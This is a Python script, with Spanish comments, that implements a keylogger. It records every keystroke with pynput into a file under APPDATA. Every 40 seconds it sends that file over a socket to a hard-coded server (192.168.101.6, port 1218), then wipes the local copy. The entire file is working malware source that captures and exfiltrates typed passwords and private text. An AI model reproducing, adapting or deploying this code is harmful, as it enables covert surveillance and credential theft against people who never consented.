from pynput import keyboard
import os
import time
import datetime
import socket
import tqdm

def keysocket():
    appdata =  os.getenv('APPDATA')
    keyfile = appdata+'/keys_socket.txt'
    segundos_espera = 40
    timeout = time.time()+ segundos_espera

    def TimeOut():
	    if time.time()> timeout:
		    return True
	    else:
		    return False

    def EnviarSocket():
        os.system("cls")
        SEPARATOR = "<SEPARATOR>"
        BUFFER_SIZE = 4096 
        host = "192.168.101.6" #Ip del servidor
        port = 1218 #Puerto
        filesize = os.path.getsize(keyfile)
        s = socket.socket()
        print(f"[+] Conectando a {host}:{port}")
        s.connect((host, port))
        print("[+] Conectado.")
        s.send(f"{keyfile}{SEPARATOR}{filesize}".encode())
        progress = tqdm.tqdm(range(filesize), f"Enviando {keyfile}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(keyfile, "rb") as f:
            for _ in progress:
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
                progress.update(len(bytes_read))
        f = open(keyfile,"r+")
        f.truncate(0)
        f.close()
        s.close()
        print("Enviado correctamente al servidor Socket")
        os.system("cls")

    def on_key_press(key):
        f = open(keyfile,"a")
        keys = str(key)
        _key_ = keys.replace("'","").replace("\n","").replace("Key.enter","\n").replace("Key.space"," ").replace("Key.backspace","\nBACKSPACE\n")
        f.write(_key_)
        print(key)
        
    print("Registrando teclas...")
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

    while True:
        
        if TimeOut():
            EnviarSocket()
            timeout = time.time()+ segundos_espera